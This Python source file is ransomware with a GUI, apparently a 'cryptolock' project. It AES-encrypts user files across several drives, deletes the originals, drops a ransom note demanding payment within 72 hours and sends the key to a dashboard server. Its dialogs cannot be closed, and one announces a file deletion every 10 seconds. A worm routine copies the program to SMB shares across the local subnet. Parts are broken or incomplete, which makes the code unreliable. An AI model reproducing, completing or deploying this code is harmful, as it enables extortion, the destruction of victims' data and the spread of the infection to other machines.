# =========================
# Imports
# =========================
import os
import sys
import base64
import uuid
import time
import logging
import threading
import tkinter as tk
from tkinter import simpledialog, messagebox
from tkinter import ttk
from PIL import Image, ImageTk
import socket
import shutil
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import requests
import ctypes

# =========================
# Constants & Config
# =========================
TERMINATION_KEY = "bingo"
SECONDARY_TERMINATION_KEY = "stop"
HOME_DIR = os.path.expanduser('~')
TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time')
TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')
DRIVES_TO_ENCRYPT = ['C:', 'D:', 'E:', 'F:']
EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx']
PASSWORD_PROVIDED = 'PleaseGiveMeMoney'
DASHBOARD_URL = 'http://localhost'
MAX_ATTEMPTS = 20
DELAY = 5

# =========================
# Resource Path Utility
# =========================
def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

# =========================
# File & Machine ID Utilities
# =========================
def ensure_time_dir_exists():
    if not os.path.exists(TIME_DIR):
        os.makedirs(TIME_DIR)

def load_machine_id():
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for drive in drives:
        machine_id_path = os.path.join(drive, "Machine_id.txt")
        if os.path.exists(machine_id_path):
            try:
                with open(machine_id_path, 'r') as file:
                    machine_id = file.read().strip()
                    print(f"Machine ID loaded successfully from {machine_id_path}: {machine_id}")
                    return machine_id
            except FileNotFoundError:
                continue
    return None

# =========================
# Logging Setup
# =========================
logging.basicConfig(
    filename='encryption_log.txt',
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(message)s',
    filemode='w'
)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s:%(levelname)s:%(message)s')
console_handler.setFormatter(formatter)
logging.getLogger().addHandler(console_handler)

# =========================
# Encryption Tool
# =========================
class EncryptionTool:
    def __init__(self, drives, extensions, password, dashboard_url, max_attempts=10, delay=5):
        self.drives = drives
        self.extensions = extensions
        self.password = password
        self.dashboard_url = dashboard_url
        self.max_attempts = max_attempts
        self.delay = delay
        self.key = self.generate_key(password)
        self.machine_id = str(uuid.uuid4())

    def generate_key(self, password):
        try:
            salt = get_random_bytes(16)
            key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)
            logging.info("Key generated successfully.")
            return key
        except Exception as e:
            logging.error(f"Failed to generate key: {str(e)}")
            raise

    def encrypt_file(self, file_path):
        try:
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            with open(file_path, 'rb') as f:
                file_data = f.read()
            encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
            with open(file_path + '.encrypted', 'wb') as f:
                f.write(iv + encrypted_data)
            os.remove(file_path)
            logging.info(f"Encrypted {file_path}")
        except Exception as e:
            logging.error(f"Failed to encrypt {file_path}: {str(e)}")
    def encrypt_files_in_directory(self, directory_path):
                    
        try:
            for root, dirs, files in os.walk(directory_path):
                if '$RECYCLE.BIN' in root:
                    continue
                for file in files:
                    if any(file.endswith(ext) for ext in self.extensions):
                        file_path = os.path.join(root, file)
                        self.encrypt_file(file_path)
            logging.info(f"All files in {directory_path} encrypted successfully.")
        except Exception as e:
            logging.error(f"Failed to encrypt files in directory {directory_path}: {str(e)}")

    def create_user_manual(self, directory_path):
        manual_content = f"""Dear User,
Your files have been secured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} with a unique machine ID: {self.machine_id}.
It means that you will not be able to access your files without the decryption key. The private key is stored in our servers and the only way to recieve
your key to decrypt your files is making payment."YOU ONLY HAVE 72 HOURS TO MAKE PAYMENT!Contact to this email: xyz@gmail.com"
"""
        manual_path = os.path.join(directory_path, "READ_ME_FOR_DECRYPTION.txt")
        try:
            with open(manual_path, "w") as manual_file:
                manual_file.write(manual_content)
            logging.info("User manual created successfully.")
        except Exception as e:
            logging.error(f"Failed to create user manual: {str(e)}")

    def send_key_to_dashboard(self):
        encoded_key = base64.b64encode(self.key).decode('utf-8')
        payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
        headers = {'Content-Type': 'application/json'}
        for attempt in range(self.max_attempts):
            logging.info(f"Attempt {attempt + 1} to send encryption key.")
            try:
                response = requests.post(self.dashboard_url, headers=headers, data=json.dumps(payload))
                if response.ok:
                    logging.info('Key sent successfully. Response OK.')
                    return True
                else:
                    logging.error(f'Attempt {attempt + 1} failed. Status Code: {response.status_code}. Response: {response.text}')
            except requests.exceptions.ConnectionError as e:
                logging.error(f"Connection error on attempt {attempt + 1}: {e}")
            if attempt < self.max_attempts - 1:
                time.sleep(self.delay)
        logging.error("All attempts to send the key failed.")
        return False

    def process_drive(self, drive):
        self.create_important_files(drive)
        self.encrypt_files_in_directory(drive)
        self.create_user_manual(drive)
        self.save_machine_id(drive)

    def execute(self):
        for drive in self.drives:
            logging.info(f"Processing drive {drive}")
            self.process_drive(drive)
        if self.save_key_locally():
            logging.info("Encryption key saved locally.")
        else:
            logging.error("Failed to save encryption key locally.")
        if self.send_key_to_dashboard():
            logging.info("Encryption key sent successfully.")
        else:
            logging.error("Failed to send encryption key.")
        logging.info("Encryption process completed.")

# =========================
# Dialog Classes
# =========================
class TerminationKeyDialog(tk.Toplevel):
    def __init__(self, parent, icon_path):
        super().__init__(parent)
        self.iconbitmap(icon_path)
        self.title("Termination Key")
        self.geometry("300x100")
        self.result = None  # Initialize the result attribute
        tk.Label(self, text="Enter the termination key to exit:").pack(pady=5)
        self.key_entry = tk.Entry(self)
        self.key_entry.pack(pady=5)
        self.key_entry.focus_set()
        tk.Button(self, text="Submit", command=self.on_submit).pack(pady=5)

    def on_submit(self):
        self.result = self.key_entry.get()
        self.destroy()
        class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
    def __init__(self, parent, icon_path, title, prompt):
        self.icon_path = icon_path
        self.prompt = prompt
        super().__init__(parent, title)
    # Step 19: Setup dialog UI
    def body(self, master):
        self.iconbitmap(self.icon_path)
        tk.Label(master, text=self.prompt).pack(pady=5)
        self.key_entry = tk.Entry(master)
        self.key_entry.pack(pady=5)
        return self.key_entry
    
    def apply(self):
        self.result = self.key_entry.get()

    # Step 20: Center the dialog window
    def center_window(self):
        self.update_idletasks()
        window_width = self.winfo_width()
        window_height = self.winfo_height()
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        position_right = int(screen_width / 2 - window_width / 2)
        position_down = int(screen_height / 2 - window_height / 2)
        self.geometry(f"+{position_right}+{position_down}")

class CountdownDialog(tk.Toplevel):
    def __init__(self, parent, countdown_time, close_app_callback):
        super().__init__(parent)
        self.countdown_time = countdown_time
        self.close_app_callback = close_app_callback
        self.init_ui()
        self.protocol("WM_DELETE_WINDOW", self.disable_event)
        self.resizable(False, False)
        self.attributes('-topmost', True)
        self.overrideredirect(True)
        self.grab_set()
        self.center_window()

    def disable_event(self):
        pass

    # Step 22: Setup countdown dialog UI
    def init_ui(self):
        self.geometry("350x150")
        self.iconbitmap(ICON_PATH)
        thanks_image = Image.open(THANKS_PATH).resize((50, 50))
        thanks_photo = ImageTk.PhotoImage(thanks_image)
        label = tk.Label(self, image=thanks_photo, bg='#f0f0f0')
        label.image = thanks_photo
        label.pack(side="left", padx=10, pady=20)
        self.countdown_label = tk.Label(self, text=f"Application will close in {self.countdown_time} seconds.", bg='#f0f0f0')
        self.countdown_label.pack(side="left", expand=True, padx=20, pady=20)
        self.update_countdown()

    # Step 23: Update countdown timer
    def update_countdown(self):
        if self.countdown_time > 0:
            self.countdown_label.config(text=f"Application will close in {self.countdown_time} seconds.")
            self.countdown_time -= 1
            self.after(1000, self.update_countdown)
        else:
            self.countdown_label.config(text="Closing application now.")
            self.close_app_callback()

    # Step 24: Center the countdown dialog window
    def center_window(self):
        self.update_idletasks()
        window_width = self.winfo_width()
        window_height = self.winfo_height()
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        position_right = int(screen_width / 2 - window_width / 2)
        position_down = int(screen_height / 2 - window_height / 2)
        self.geometry(f"+{position_right}+{position_down}")
class DeletionCountdownDialog(tk.Toplevel):
    def __init__(self, parent, stop_deletion_callback):
        super().__init__(parent)
        self.iconbitmap(ICON_PATH)
        self.stop_deletion_callback = stop_deletion_callback
        self.attributes('-topmost', True)
        self.title("Deletion Countdown")
        self.resizable(False, False)
        
        window_width = 400
        window_height = 200
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        position_right = int(screen_width/2 - window_width/2)
        position_down = int(screen_height/2 - window_height/2)
        
        self.geometry(f"{window_width}x{window_height}+{position_right}+{position_down}")
        
        self.protocol("WM_DELETE_WINDOW", self.on_try_close)
        self.grab_set()
        self.focus_force()
        self.init_ui()
    # Step 26: Setup deletion countdown dialog UI
    def init_ui(self):
        thanks_image = Image.open(THANKS_PATH).resize((80, 80))
        thanks_photo = ImageTk.PhotoImage(thanks_image)
        label_image = tk.Label(self, image=thanks_photo)
        label_image.photo = thanks_photo
        label_image.pack(pady=20)

        self.label_countdown = tk.Label(self, text="Next file will be deleted in Every 10 seconds...", font=("Helvetica", 12))
        self.label_countdown.pack()

        button_stop = tk.Button(self, text="Enter Key", command=self.on_enter_key,
                            font=('Helvetica', 10),
                            relief=tk.FLAT)
        button_stop.pack(pady=10, padx=10, ipadx=20, ipady=5)

    def on_try_close(self):
        messagebox.showwarning("Warning", "This window cannot be closed directly.")

    # Step 27: Handle submission of the secondary termination key
    def on_enter_key(self):
        self.iconbitmap(ICON_PATH)
        key = CustomSecondaryTerminationKeyDialog(self, ICON_PATH, "Stop Deletion", "Enter the secondary termination key:").result
        if key == SECONDARY_TERMINATION_KEY:
            self.stop_deletion_callback()
            self.destroy()
        else:
            messagebox.showerror("Error", "Incorrect secondary termination key.")


    # Step 29 : Function to check for remote stop signal
    def check_for_remote_stop_signal(self, machine_id, check_interval=10):
        url = f"http://localhost/cryptlock/includes/api/check_stop_signal.php?machine_id={machine_id}"
        while not self.stop_deletion:
            try:
                response = requests.get(url, timeout=10)
                response.raise_for_status()
                data = response.json()
                if data.get("stop_signal") == "1":
                    self.stop_deletion_process_remotely()
                    break
            except requests.exceptions.RequestException as e:
                pass
            time.sleep(check_interval)

    # Step 29.1: Function to stop the deletion process remotely
    def stop_deletion_process_remotely(self):
        if not self.stop_deletion:
            self.stop_deletion = True
            self.deletion_stopped = True
            self.stop_event.set()
            self.log("Deletion process stopped by remote command.", 'blue')
            if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
                self.deletion_dialog.destroy()
                self.deletion_dialog = None
                # =========================
# Dashboard Reporting
# =========================
def report_key_to_dashboard(machine_id, key, dashboard_url, max_attempts=20, delay=5):
    import base64, json, requests, time, logging
    encoded_key = base64.b64encode(key).decode('utf-8')
    payload = {'machine_id': machine_id, 'encryption_key': encoded_key}
    headers = {'Content-Type': 'application/json'}
    for attempt in range(max_attempts):
        try:
            response = requests.post(dashboard_url, headers=headers, data=json.dumps(payload))
            if response.ok:
                logging.info('Key sent successfully. Response OK.')
                return True
            else:
                logging.error(f'Attempt {attempt + 1} failed. Status Code: {response.status_code}. Response: {response.text}')
        except requests.exceptions.ConnectionError as e:
            logging.error(f"Connection error on attempt {attempt + 1}: {e}")
        if attempt < max_attempts - 1:
            time.sleep(delay)
    logging.error("All attempts to send the key failed.")
    return False

# =========================
# Auto-Spread Functionality
# =========================
def auto_spread_ransomware(ransomware_path):
    import socket, shutil, logging
    local_ip = socket.gethostbyname(socket.gethostname())
    ip_parts = local_ip.split('.')
    base_ip = '.'.join(ip_parts[:3])
    for i in range(1, 255):
        target_ip = f"{base_ip}.{i}"
        for port in [445, 139]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                if result == 0:
                    target_path = f"\\\\{target_ip}\\C$\\ransomware.exe"
                    try:
                        shutil.copy(ransomware_path, target_path)
                        logging.info(f"Spread ransomware to {target_path} (port {port} open)")
                        break  # Only copy once per host
                    except Exception as e:
                        logging.warning(f"Failed to spread to {target_ip} on port {port}: {e}")
            except Exception:
                continue

# =========================
# Main Execution
# =========================
if name == "__main__":
    ensure_time_dir_exists()
    machine_id = load_machine_id()
    if not machine_id:
        encryption_tool = EncryptionTool(DRIVES_TO_ENCRYPT, EXTENSIONS_TO_ENCRYPT, PASSWORD_PROVIDED, DASHBOARD_URL, MAX_ATTEMPTS, DELAY)
        encryption_tool.execute()
        report_key_to_dashboard(encryption_tool.machine_id, encryption_tool.key, DASHBOARD_URL, MAX_ATTEMPTS, DELAY)
        ransomware_path = os.path.abspath(__file__)
        auto_spread_ransomware(ransomware_path)